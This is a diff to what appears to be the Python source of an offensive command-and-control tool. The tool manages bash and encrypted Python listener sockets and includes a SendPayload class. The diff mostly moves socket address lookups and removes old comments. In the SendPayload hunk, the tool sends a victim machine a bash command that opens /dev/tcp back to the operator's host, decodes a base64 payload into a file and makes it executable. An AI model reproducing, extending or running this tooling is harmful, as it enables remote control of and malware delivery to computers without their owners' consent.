@@ -41,12 +41,14 @@ class BashServerSocket():
         self.inputs = [self.server_socket]
         self.outputs = []
         self.message_queues = {}
-        self.server_address, self.server_port = self.server_socket.getsockname()
+        self.server_address = None
+        self.server_port = None
         self.client_socket = None
         self.client_address = None
 
 
     def listen(self):
+        self.server_address, self.server_port = self.server_socket.getsockname()
         self.server_socket.listen()
 
         logging.info(f"Started listener on {self.server_address, self.server_port}")
@@ -75,8 +77,6 @@ class BashServerSocket():
         else:
             return False
 
-    # TODO: 06/2022: Figure out what I wrote a year ago
-    # NOTE: 07/2023: What the hell is this
     def send_command(self, command=None, wt_output=True):
         """Gets data from client with proper monitoring using select() and queue for sending data.
         """
@@ -143,20 +143,13 @@ class BashServerSocket():
 
                     del self.message_queues[s]
 
-            # if not readable and not writable and not exceptional:
-            #     try:
-            #         self.server_socket.sendall(b"")
-            #     except(BrokenPipeError):
-            #         for s in readable:
-            #             self._close_socket(s)
-            #     return False 
-
 
 class PyServerSocket():
     def __init__(self, sock_type=socket.SOCK_STREAM):
         self.server_socket = socket.socket(socket.AF_INET, sock_type)
-        self.server_address, self.server_port = self.server_socket.getsockname()
         self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.server_address = None
+        self.server_port = None
         self.client_socket = None
         self.client_address = None
         self.is_open = True
@@ -164,6 +157,7 @@ class PyServerSocket():
         self.lock = threading.Lock()
 
     def listen(self):
+        self.server_address, self.server_port = self.server_socket.getsockname()
         logging.debug(f"Started listener on {self.server_address, self.server_port}")
         self.server_socket.listen(1)
         self.client_socket, self.client_address = self.server_socket.accept()
@@ -208,7 +202,6 @@ class PyServerSocket():
         return self.crypto.decrypt_message(bytes(data_bytes), self.derived_key)
 
     def send_command(self, msg):
-        '''TODO CHANGE THIS TO SEND LARGE DATA IN CHUNKS'''
         self.send_msg(msg)
         msg = self.recv_msg()
         
@@ -239,7 +232,7 @@ class SendPayload():
         self.server_address, self.server_port = self.server_socket.getsockname()
 
         self.server_socket.listen(1)
-        test = self.main_socket.client_socket.send(f"bash -c \"cd /tmp || cd /var/tmp || cd /dev/shm ; exec 3<>/dev/tcp/{self.host}/5252 ; cat <&3 | base64 -d > payload; chmod +x payload\"\n".encode())
+        test = self.main_socket.client_socket.send(f"bash -c \"exec 3<>/dev/tcp/{self.host}/5252 ; cat <&3 | base64 -d > payload; chmod +x payload\"\n".encode())
 
         self.client_socket, self.client_address = self.server_socket.accept()
         logging.debug(f"Connection established with {self.client_address}")
